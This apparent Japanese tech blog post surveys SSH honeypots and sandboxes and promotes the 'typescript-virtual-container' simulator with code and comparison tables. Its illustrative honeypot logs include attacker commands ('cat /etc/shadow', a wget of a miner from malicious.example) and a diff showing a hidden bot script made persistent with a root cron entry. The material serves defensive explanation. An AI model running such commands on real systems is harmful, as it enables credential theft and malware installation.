KippoはCowrie土台の元祖中対話SSHハニーポットだ。同じ基本発想：本物SSH protocol、偽ファイルシステム、部分的シェルだ。Cowrieが現時点で完全置き換えた。Kippoは保存で2026年に誰も使うべきじゃない。古ブログ記事や安全論文で参照されるかもだから歴史完全用にここに言及するだけだ。

**GitHub**：[desaster/kippo](https://github.com/desaster/kippo)。保存

---

### 4.3 endlessh。SSH tarpit

endlesshは縮退ハニーポットだ。SSH接続を開いたまま、banner データを1バイト毎秒以下でゆっくり流して保つ。接続するSSHクライアントは無限詰まる。サーバーが banner 送り終えないから認証に絶対届かない。

目標は脅威情報じゃなく純粋資源拒否だ。攻撃者走査スレッドを塞いで本物標的に届くのを遅らせる。正直良い意味でちょっと意地悪だ。攻撃者から何も学ばない。時間を無駄遣いさせるだけだ。そこに深い満足がある。

```c
// endlesshの全protocol挙動：
// 送る："SSH-2.0-OpenSSH_" の後にランダム文字ゆっくり追加
// 接続を絶対閉じない
// 攻撃者スキャナはN秒後に期限切れ
```

命令は取らない。認証は試さない。接続時間だけだ。

**書き**：C  
**GitHub**：[skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame。「全員入れろ」ハニーポット

sshesameは全SSH接続を受け付ける（任意ユーザー、任意パス、任意鍵）。全部記録する。ゼロ対話ハニーポットだ。命令に応答しない。攻撃者を「入れ」て打つ各打鍵を記録するだけだ。

```
2024-01-15 03:22:11 45.33.32.156から接続
  ユーザー：root、パス：password123 → 受理
  打った命令：
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  47秒後に切断
```

認証情報収穫に便利だ。ボットが試すユーザー名とパスが速く溜まる。今活発に総当たりされるデフォルト認証情報が分かる。ネタバレ：つねに`root`や`password`、`admin`や`admin`、`root`や`123456`だ。毎回だ。

**GitHub**：[jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird。Docker基準ハニーポット枠組み

`lyrebird/honeypot-base`は網サービスハニーポット作りのDocker基準 image だ。特にSSHハニーポットじゃない。任意 protocol ハニーポット作りの枠組みだ。

基準 image は記録枠組み、protocol 用 plugin 制、複数サービスハニーポット用Docker Compose設定を出す。拡張して特定サービスを真似る。

**Docker Hub**：[lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Node.jsでSSHハニーポット作る。素朴法と、なぜ失敗するか

`typescript-virtual-container`前は、Node.jsでSSHハニーポット作るのは本物`ssh2`ライブラリと手動命令真似の組み合わせを意味した。とても面倒で、とても不完全で、でもここは通る儀式だ。

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // 試行を記録
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // 全員入れる
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // 応答を真似る
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

認証情報と命令を取る意味で「動く」。でも洗練攻撃者が少し掘れば明らかに偽だ。`uname -a`は正しい文字列を返すのに`ls /etc`は「command not found」だ。罠臭ぷんぷんだ。ファイルシステムはない。命令は繋がらない。管は動かない。変数は expand しない。

有能攻撃者は最初5命令でハニーポットを特定する。Cowrie風挙動を探す自動スクリプトも即検出する。`typescript-virtual-container`作者が本物に命令解釈するものを構築に至らせたのは表向きこれだ。パート5でもっとね。

---

### ハニーポット系統まとめ

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | 素朴ssh2 |
|---|---|---|---|---|---|---|
| **対話水準** | 中高 | 中 | ゼロ | ゼロ | 可変 | 低 |
| **本物SSH protocol** | ✅ | ✅ | ❌ (tarpit) | ✅ | 可変 | ✅ |
| **シェル忠実度** | 中 | 中 | 該当なし | なし | 可変 | 最小 |
| **認証情報を取る** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **命令を取る** | ✅ | ✅ | ❌ | ✅ | 可変 | ✅ |
| **マルウェアを取る** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM統合** | ✅ ネイティブ | ❌ | ❌ | ❌ | ❌ | 手動 |
| **LLM応答** | ✅（新） | ❌ | ❌ | ❌ | ❌ | ❌ |
| **言語** | Python | Python | C | Go | Docker | Node.js |
| **Node.jsネイティブ** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **状態** | ✅ とても活性 | ⚠️ 保存 | ✅ 活性 | ✅ 活性 | ✅ 活性 | DIY |

模様はここでかなり明確だ。忠実度が欲しいほどPythonを書く。Cowrieは本気なら疑いない勝者だ。現場で年数かけて鍛えられて、単なる認証情報を超えて取る。endlesshとsshesameは真面目脅威情報道具より面白プロジェクトだ。Node.js素朴手法は壁に当たる前に道の20パーセントかもしれない。

---

## パート5。`typescript-virtual-container`：溝を埋めるもの

はいここから面白くなる。上系統全部目録した後、空 quadrant はかなり明らかだ。

- JSサンドボックス：コード隔離、シェルなし、ファイルシステムなし、SSHなし
- Linuxエミュレータ：本物OS、本物シェル、本物SSH。でもRAM 150MB超、起動30秒、串行I/O上に自前API作らなきゃいけない
- ハニーポット：偽シェル、プログラム可能APIなし、PythonやGoやC、Nodeネイティブじゃない

完全でプログラム可能でネイティブNodeなLinux環境で、本物SSH、本物権限、本物仮想網、型付きTypeScript APIのものを誰も作ってなかった。だから彼女は作った。

小さな紹介。ここで初めて正しく言及するからね。`typescript-virtual-container`は[Chloé Rolzhausen](https://itsrealfortune.fr)が作った。オンラインで**Fortune**（ItsRealFortune）を名乗るフランス開発者だ。[サイト](https://itsrealfortune.fr)と[LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/)で見つけられる。全プロジェクト、56,000行TypeScript、247ファイル、170命令は1人の単独作業だった。残り記事ではFortuneって呼ぶ。うんかなりすごい。仕事見に行って！

### 実際に何か

`typescript-virtual-container`は純TypeScript書きの**Linux環境シミュレータ**だ。Wasmなし、ネイティブ拡張なし、カーネルなしだ。約56,000行ソースが247 TypeScriptファイルに分かれる。

鍵洞察：`ls /etc | grep passwd`を動かすのにCPUエミュは要らない。要るのはこうだ。
1. 道演算に応答するメモリ内節木
2. 各アクセスに適用するPOSIX権限モデル
3. pipelineもredirectもsubshellも変数 expand も分かるシェル構文解析器
4. 約170命令実装（関数で、バイナリじゃない）
5. ユーザーと群管理制
6. 全部SSH越しに出す何か

全部カーネル関与なしの純TypeScriptでできる。

### VirtualFileSystem

VFSは型付き節のメモリ内木だ。明示`"fs"`永続モード有効にしない限りディスクI/Oなしだ。

```ts
// 簡略内部表現
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // 遅延読み込み placeholder
```

各道演算は`normalizePath`（`.`や`..`や symlink 解決）と`enforceAccess`（要求uidやgidに対する読み書き実行権限確認）を通る。`chmod`、`chown`、sticky bit、setuidは全部実装されて本当に適用する。uid 1000で動くプロセスがroot所有モード0600ファイル読もうとしたらEACCESになる。偽EACCESじゃない。権限確認から投げられる本物JavaScript `Error`だ。この部分はかなり優雅だ正直。

VFSはこう直列化する。
- `.vfsb` → 小さいバイナリ形式（自作、fflate圧縮）。デフォルト形式だ
- JSON snapshot → 人間可読、デバッグ良し
- TAR保存 → 本物tar形式 import や export。`tar -xf`すればVFSはただそのファイルを持つ
- SquashFS image → 読み取り専用 import だ

`"fs"`永続モードでは crash 後回復用に先行書き込み log （WAL）を保つ。書き込みはまず日誌へ、flush 時に snapshot へ行く。Nodeが演算途中で死んだら、日誌で最終完全状態を再構築できる。

`FileCache`層もあってディスクI/O遅延を真似る。`NVME_DISK_IO`や`HDD_DISK_IO`みたいな profile を設定して、VFSは本物らしい timing に合わせるようファイル演算を人工遅延させる。わざと遅くする software ってかなり笑える。ハード真似るためにね。でも目安測定には本当に便利だ。

### シェル解釈器

シェル構文解析器は型付きASTを作る。

```ts
// "ls /etc | grep root && echo done" はこう解析される：
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

実行器はこのASTを歩く。
- pipeline用に、`{ stdin, stdout, stderr }`流連鎖を作って各命令を pipeline I/O付きで実行する
- 論理演算子（`&&`、`||`）用に、右実行前に左の`$?`を確認する
- sub shell（`$(...)`、`` ` ` ``）用に、実行文脈を分岐する
- redirect（`>ファイル`、`>>ファイル`、`2>&1`、`<ファイル`）用に、実行前に流配線を設定する
- 背景仕事（`cmd &`）用に、終わり待たず実行する
- 変数用に、`$VAR`、`${VAR:-default}`、`${#VAR}`、算術`$((expr))`を expand する
- 波括弧 expand（`{a,b,c}`、`{1..5}`）用に、実行前に完全 expand 一覧を作る

全部本物POSIXシェル挙動だ。解析器はheredoc、プロセス置換、glob（`*`、`?`、`[abc]`）、引用管理（単引用、二重引用と補間、円記号 escape）を扱う。完璧じゃない。際どい場合はある。でもTypeScriptプロジェクトの期待を大きく超える。

### 約170内蔵命令

命令は`CommandContext`を受けるTypeScript関数で命令登録簿に登録する。stdinやstdoutやstderr流、VFS、利用者 session、シェル環境、子 module へのアクセス付きだ。

170 Unix命令実装を書くのはこうだ。多い。一部は平凡（`echo`、`true`、`false`）、一部は驚くほど複雑（`awk`、`find`、`tar`）だ。つまり完全POSIX `awk`だ。TypeScriptでだ。すごい正直。入ってる抜粋はこうだ。

```
cat、ls、cp、mv、rm、mkdir、rmdir、touch、chmod、chown、chgrp、
ln、readlink、find、locate、stat、file、
echo、printf、read、test、[、[[、
grep、sed、awk、cut、sort、uniq、wc、head、tail、tr、
ps、top、kill、pkill、nice、ionice、
ssh、scp、sftp（外向きクライアント側）、
ping、curl、wget、nc、netstat、ss、ip、ifconfig、route、
apt、apt-get、apt-cache、dpkg、pacman、
useradd、usermod、userdel、groupadd、passwd、su、sudo、
tar、gzip、gunzip、bzip2、bunzip2、xz、unxz、zip、unzip、
git (stub)、python3 (stub)、node (stub)、
nano（完全対話編集器）、vim（基本）、vi（基本）、
neofetch、htop、tree、df、du、free、uptime、who、w、last、
cron（真似）、systemctl (stub)、journalctl (stub)、
他約130
```

「stub」（git、python3、node）はよくある呼び出しに現実応答する。`python3 --version`は信用できる版文字列を返す。`git status`は架空リポジトリ状態を示す。本物仕事はしない。ハニーポットには本物命令より実は有用だ。危険なもの何も実行せず攻撃者が何実行しようとしたか観測できるからね。

### SSHサーバー

SSH層は本物npm `ssh2`パッケージを使う。本物SSH protocol、本物鍵交換、本物暗号だ。`SSHMimic`が包む。

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// 本物SSH：ssh -p 2222 root@localhost
// 本物SFTP：sftp -P 2222 root@localhost
// 本物SCP：scp -P 2222 file root@localhost:/tmp/
```

`shellProperties`が`uname -a`や`lsb_release -a`や`neofetch`や`/proc/version`や`/etc/os-release`の報告を決める。任意Linux配布とカーネル版を説得力真似できる。本物SSHクライアントには文字通り違いが分からない。

### HoneyPotモジュール

シェル解釈器が本物でSSHサーバーが本物だから、攻撃者命令は仮想環境で本当に実行する。攻撃者が起こす`wget`要求は目的地URL付きで記録する。攻撃者が作るファイルはVFSに保存する。攻撃者の権限昇格試行は現実エラーを出す。

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// session 後、ファイルシステムを差分する
const before = shell.vfs.toSnapshot();
// ... 攻撃者 session ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Cowrieと質的に違う。Cowrie偽ファイルシステムは`ls`に応答できるけど、攻撃者が作ったファイルを追って構造化差分として変化を出すことはできない。`typescript-virtual-container`はできる。VFSが生きデータ構造だからだ。各書き込みが追跡される。攻撃者が足したcronエントリ？差分にある。その`.hidden`フォルダ？差分にある。マルウェア分析にかなり便利だ。

### 仮想網 stack

たぶんプロジェクト全体でいちばん印象的な部分で、この領域の他プロジェクトに同等物はない。完全L2やL3仮想網 stack にVPN対応だ。純TypeScript書きで、本物網カード関与なしだ。本当にすごい。

`VirtualNetworkManager`は各`VirtualShell`インスタンスに設定可能IPアドレス付き仮想網 interface、経路表、 software ファイアウォール（conntrackとNAT付きiptables式規則）を与える。`ip addr`、`ip route`、`iptables -L`、`netstat -rn`は全部仮想網状態を示す。

`VirtualSwitch`（Baieって名。サーバー室の仏語「baie informatique」から）が複数シェルを共有 subnet で繋ぐ。実装するのはこうだ。
- MAC学習とARP
- subnet 間IP経路
- NAT（外向き masquerade）
- DNS（subnet ごと設定可能記録）
- 負荷分散（round-robin、最少接続）
-  traffic 整形：遅延、ジッター（正規分布）、packet 損失、burst 損失、並べ替え、複製
- 帯域上限（token bucket）
- MTU適用
- 接続追跡（状態付き、NEWやESTABLISHEDやTIME_WAIT状態）

```ts
const baie = new Baie("192.168.0.0/24");

// 同 switch 上の3仮想マシン
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// ファイアウォール：webはapi到達可、apiはdb到達可、webはdb直接不可
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// traffic 整形：外への不安定WAN線路を真似る
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn`はBaieインスタンス間に暗号 tunnel を作る。 site 間VPN相互接続付き複数 site 網を真似できる。

`VirtualProxy`は port 転送とSOCKS5 proxy を実装する。

どれも本物網カードに触らない。全部TypeScript物経路だ。`ping`命令は仮想 switch 経由で経路して模擬ICMP応答を返して「動く」。`curl http://192.168.0.3/api`は仮想網経由で route して、apiシェルの模擬HTTP応答に届いて、内容を返す。下まで亀だ。良い意味でね。

### SandboxedShell

強固隔離が要る program 利用向けに、`SandboxedShell`はNode.js Workerスレッド内で shell session を実行する。

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 1コア25%
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

隔離はここでVFS層（ worker スレッドの shell は仮想ファイルシステムだけ見えて、ホストファイルシステムは見えない）とNode.js Workerスレッドメモリ隔離で保つ。`isolated-vm`より軽いけど、JS水準じゃなく shell 水準隔離に適する。

### 資源上限

shell ごとに資源上限を設定できて、 system 監視命令の報告に影響する。

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

この shell 内で`free -m`は合計RAM 512MBを示す。`nproc`は2を返す。`/proc/meminfo`は上限値を示す。`htop`と`top`は上限CPU数を示す。これで真似マシンの hardware 姿を正確に決められる。

### 3デプロイモード

```
モード1：SSHやSFTPサーバー
  VirtualSshServer / VirtualSftpServer
  → 本物SSH protocol、本物SFTP、本物SCP
  → 用途：ハニーポット、遠隔試験環境、訓練 lab

モード2：ウェブ shell（ブラウザ）
  builds/fortune-nyx-v1.7.8-web.min.js (ESM bundle)
  → ブラウザで回る、IndexedDBにVFS永続
  → 用途：対話教程、埋め込み端末、デモ
  → おまけ：完全模擬XFCE机用にstartxfce4を実行

モード3：自立CLI
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs（1ファイル、 install なし）
  → curlして実行、.vfs/フォルダにVFS永続
  → 用途：速いデモ、 local 実験
```

### ポリフィル。ブラウザ build がWasmなしで動く方法

はいここは私が本当に賢いと思って特に取り上げたかった部分だ。

Node.jsライブラリをブラウザで動かすのはふつう悪夢だ。Wasmランタイム使うか（重い、読み込み遅い）、各`node:*` import を手でブラウザ代替へ置き換えるのに数週間かけるかだ。Fortuneは2つ目をやった。でもとてもきれいにね。リポジトリ`polyfills/`フォルダに住む自作ポリフィル集合を書いてだ。

build pipeline はesbuildに`alias`入口たくさんなだけだ。

```js
// demo/build.js。ブラウザ build 設定全部
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Wasmなし、外部ポリフィルライブラリなし、`webpack-node-externals`頼みなしだ。ただの alias 化 module と注入 global 数個だ。各々詳しく言う。いくつか本当に印象的だからね。

**`node:fs`。偽ファイルシステムとしてのIndexedDB**

これは私のお気に入りだ。`node:fs`ポリフィルはNode.js同期 fs API（`readFileSync`、`writeFileSync`、`existsSync`、`readdirSync`、`mkdirSync`、`unlinkSync`、`statSync`など）を2層で支える。読む用メモリ内`Map`と、ページ再読み込み間の永続用IndexedDBだ。書き込みは即Mapへ行って（だから`readFileSync`直後`writeFileSync`はつねに動く）、後で非同期にIndexedDBへ流す。

```js
// 同期キャッシュ（道 → Uint8Array | null）。読み取り即時
const memCache = new Map();

// IndexedDBから起動時にmemCacheへ全部事前読み込み
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

VFS snapshot がブラウザでページ再読み込みを生き延びるのはこのためだ。`.vfsb`バイナリ全体がこのポリフィル経由でIndexedDBに書かれて、次読み込みで読み戻す。Wasmなし、サーバーなしだ。2011年から全ブラウザにあるIndexedDBだけだ。

**`node:crypto`。純JSのSHA-256**

Wasm暗号ライブラリ import の代わり、cryptoポリフィルはFIPS 180-4 tour 定数使ってゼロからSHA-256を実装する。166行の純JSでhexやbase64やUint8Array出力完全対応だ。ライブラリ内全 hash はここを通る。ホスト鍵指紋も内部 checksum もね。小さくて、依存ゼロで、動く。

**`node:os`。ブラウザの本物 hardware を読む**

これは良い心遣いだ。ハードコード偽値を返す代わり、`node:os`はRAM合計用`navigator.deviceMemory`とCPU数用`navigator.hardwareConcurrency`を読む。だからブラウザ build の`neofetch`は本当に自分のマシンに合うものを報告する。偽`2コア2GB RAM` stub じゃない。

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // デフォルト2GB
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // navigator.userAgentも解析してCPUモデル文字列を推測
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`、`ssh2`、`roxify`。正直スタブ**

ブラウザはTCPソケットも本物SSHも開けない。だから明示メッセージ付き`NotImplemented`エラーを投げるスタブだ。`undefined`返しで物待ちみたいな失敗はしない。ただの大きく明確な「ブラウザでは動かない」メッセージだ。まさに欲しいものだ。

**`process.js`と`buffer.js`。注入 global**

この2つはesbuild `inject`選択肢経由で bundle 内各ファイル頭に注入される。明示 import なしで`process`と`Buffer`が global 利用可能だ。`process.js`はちっぽけだ。`env`、`version`、`platform: 'browser'`、`nextTick`経由`queueMicrotask`、`uptime`経由`performance.now()`だ。`buffer.js`は`Uint8Array`上の完全`Buffer`再実装だ。SSH実装とVFSが依存する全`readUInt32BE`や`writeInt16LE`やhexやbase64符号化だ。

---

手書きポリフィル集合は合計約640行だ。npmパッケージなし、Wasmなしだ。結果はただライブラリなブラウザ bundle で、ネイティブに回る。「でもブラウザで本当に動くの」のいつもの不安なしだ。Node優先設計ライブラリにあるやつね。リポジトリ内`polyfills/`フォルダをのぞく価値ある。気になるならね。各ファイルはよく収まってて単独で読める。私がかなり好きな文体選択だ。

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **カテゴリ** | JSサンドボックス | JSサンドボックス | JSサンドボックス | エミュレータ | エミュレータ | Node.js/Wasm | ハニーポット | シミュレータ |
| **JS隔離** | ⚠️ スコープ | ✅ V8 Isolate | ✅ Wasm | 該当なし | 該当なし | 部分的 | ❌ | ✅ Worker |
| **本物Linuxカーネル** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **シェル解釈器** | ❌ | ❌ | ❌ | ✅（本物） | ✅（本物） | ✅（本物） | 部分的 | ✅（自作） |
| **約170 Unix命令** | ❌ | ❌ | ❌ | ✅ | ✅ | 部分的 | 約20 | ✅ |
| **POSIX権限** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | 部分的 | ✅ 適用 |
| **ユーザー管理** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 最小 | ✅ 完全 |
| **本物SSHサーバー** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **ハニーポットや監査** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS差分や snapshot** | ❌ | ❌ | ❌ | 限定 | ❌ | ❌ | ❌ | ✅ |
| **L2やL3仮想網** | ❌ | ❌ | ❌ | 基本 | ❌ | ❌ | ❌ | ✅ 完全 |
| **仮想VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **ブラウザ対応** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.jsネイティブ** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **型付きAPI** | 基本 | ✅ | ✅ | 最小 | ❌ | ✅ | ❌ | ✅ 完全 |
| **バイナリ互換** | 該当なし | 該当なし | 該当なし | ✅ | ✅ | 部分的 | 該当なし | ❌ |
| **起動時間** | 即時 | 即時 | 即時 | 15-40秒 | 15-40秒 | 2-5秒 | 即時 | 1秒未満 |
| **RAM/インスタンス** | 約1MB | 約3-10MB | 約5-15MB | 150-256MB | 200MB超 | 約100MB | 約50MB | 約5-20MB |
| **実行時依存** | 0 | 1（ネイティブ） | 1 (Wasm) | 0 | 非公開 | 1 | Python依存 | 3 (ssh2、ws、fflate) |
| **状態** | 安定 | ✅ 活性 | ✅ 活性 | ✅ とても活性 | 商用 | ✅ 活性 | ✅ 活性 | ✅ 活性 |

---

## 何に何を使うか

**信用できないJavaScriptを実行しなきゃいけない。ユーザー提出式、プラグイン、スクリプト hook。**  
→ `isolated-vm`だ。本物V8 Isolate、厳密メモリ上限、明示通信橋だ。`vm2`は避ける。CVE一覧は伸びるだけだ。本気で今月の注意報見て。`vm`は避ける。そもそもサンドボックスじゃない。お願いだ。

**JS隔離してネイティブ拡張要らないか、ブラウザ互換が要る。**  
→ `quickjs-emscripten`だ。Wasm境界、約500KBモジュール、ブラウザとNodeで動く。V8より遅いけど本当に隔離する。

**無改造の本物Linux OS起動でバイナリ互換が要る。**  
→ 32ビットLinux用`v86`か、既存Docker image あるなら`container2wasm`だ。RAM 150MB超と起動30秒を受け入れる。取引だ。64ビット要るならCheerpXかただ本物コンテナランタイムを使う。

** backend なしでウェブアプリにLinux風端末を入れなきゃいけない。**  
→ `v86`（完全OS、重い、起動遅い）か`typescript-virtual-container`ブラウザ bundle（シミュレータ、軽い、即起動、`startxfce4`で完全机付きでかなりすごいよ）。

**オンライン対話コーディング教程やブラウザIDEが要る。**  
→ Node.js生態系集中ならWebContainersだ。本物Linuxユーザー空間要るならCheerpXだ。軽め選択肢で型付きAPI欲しいなら`typescript-virtual-container`ブラウザ bundle だ。

**大規模にSSH攻撃者TTPを集めたい。**  
→ Cowrieは本番標準だ。以上だ。任意Linuxサーバーで回る。全SIEMと統合する。今LLMモードある。Cowrie使うだけだ。

**Node.jsアプリ内でSSHハニーポットデータが欲しくて program 可能API付き。**  
→ `typescript-virtual-container`だ。命令は本当に実行する。VFSは本物データ構造で即 snapshot 取って差分できる。攻撃者は説得力対話環境を得て、君はNode出ず構造化監査データを得る。

** shell 自動化やCI試験が要る。Dockerなしで。**  
→ `typescript-virtual-container`だ。1秒未満で起動する。試験前に snapshot、後に復元だ。型付きAPIで shell 命令を実行する。Docker daemon なし、カーネルなし、VMなし、待ちなしだ。

**複数借り手 shell 環境が要る（SaaS、教育、訓練）。**  
→ `typescript-virtual-container`だ。エミュレータ150-256MBに対しインスタンス5-20MBだ。同時100ユーザー：約2GB対約25GBだ。 hosting 費で大きい違いだ！

**現実ハニーポットが欲しくて複数VM lab 網も作りたい。**  
→ `typescript-virtual-container`はこの領域で両方やる唯一だ。

---

## できないこと（正直に言っとく）

ネイティブx86バイナリは実行できない。Cコード compile したい、本物Python解釈器実行したい、Linux向け compile 済 software 使いたいなら、そのシステムコールを支えるカーネルABIはない。`gcc`や`python3`や`node`みたいな命令は stub だ。`--version`やよくある呼び出しに応答するけど、本物は何も実行しない。

これが根本交換だ。10-50倍少ないメモリ、即起動、ブラウザ互換、型付きAPI、本物SSH、仮想網を得て、ユーザー空間バイナリ互換を捨てる。

Fortuneは設計でかなり考えた。狙った用途、ハニーポット、試験、埋め込み端末、CI環境では compile バイナリ実行は実際要らない。 shell pipeline、ファイル操作、経路、SSHが全部カバーする。でも用途が本物 compile 済 software 要るなら、`v86`かDockerが正しい答えだ。これじゃない。

---

## 結びに

はい以上だ。この生態系は外から見えるより広くて断片化してる。`vm`はスコープ区切りでサンドボックスじゃない。`vm2`はCVE積み続ける（本気で今月の注意報見て）。`isolated-vm`はJS隔離の正しい答えだがJSだけだ。`quickjs-emscripten`はブラウザ互換要るときやネイティブ拡張避けたいときの正しい選択だ。`v86`とCheerpXは本物バイナリ互換要るときの本物エミュレータだ。WebContainersはWasmのNode.jsで、汎用Linux環境じゃない。CowrieはSSHハニーポットの黄金律だが、PythonでNodeネイティブじゃない。

そして`typescript-virtual-container`がある。Fortuneのプロジェクトだ。独自カテゴリに少し住む。エミュレータでもJSサンドボックスでも受動ハニーポットでもない。間の何かで、他どれもできない多くのことに驚くほど有用と分かった。

`typescript-virtual-container`は他どれも触らない溝を埋める。完全 program 可能 shell Linux環境で本物SSH、SFTP、POSIX権限、ユーザー管理、仮想網、型付きTypeScript API付き。約10MBで回って、1秒未満で起動して、Node.jsとブラウザ両方で動く。

試したいなら：ソースコードは[github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)にある。オンライン demo（含む完全机用`startxfce4`で本気やばい）も[itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)にある。見に行ってGitHubでFortuneに星残して。値するよ！

読んでくれてありがとう。私基準でも長かった :) 役に立ったらいいな！

---

## 出典

各主張に一次出典を付けようとした。CVE注意報、公式文書、GitHubリポジトリ、メンテナブログ記事だ。いくつか note：vm2のCVE一覧は伸び続ける。FortiGuardリンクは読む頃に古いかも（最新はGitHub注意報ページ見て）。Bellardリンクは全部安定だ。個人サイトは昔からあって内容変わらない。ポリフィルのどれか深掘りしたいなら、リポジトリ内`polyfills/`フォルダを直接漁ればいい。私がここに書ける説明より読みやすい。

### JavaScriptサンドボックス

- **Node.js `vm`モジュール**。公式文書：[nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm`安全警告**。「vmモジュールは安全機構じゃない。信用できないコード実行に使うな」：[nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
